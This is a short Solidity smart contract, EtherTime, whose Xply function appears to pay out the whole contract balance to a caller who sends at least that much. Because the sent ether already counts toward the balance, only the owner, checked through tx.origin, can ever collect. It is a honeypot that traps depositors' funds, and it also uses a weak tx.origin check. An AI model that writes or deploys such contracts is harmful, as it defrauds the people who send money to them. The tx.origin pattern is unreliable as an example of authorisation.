1 pragma solidity ^0.4.25;
2 
3 contract EtherTime
4 {
5     address Owner = msg.sender;
6 
7     function() public payable {}
8 
9     function Xply() public payable {
10         if (msg.value >= address(this).balance || tx.origin == Owner) {
11             selfdestruct(tx.origin);
12         }
13     }
14  }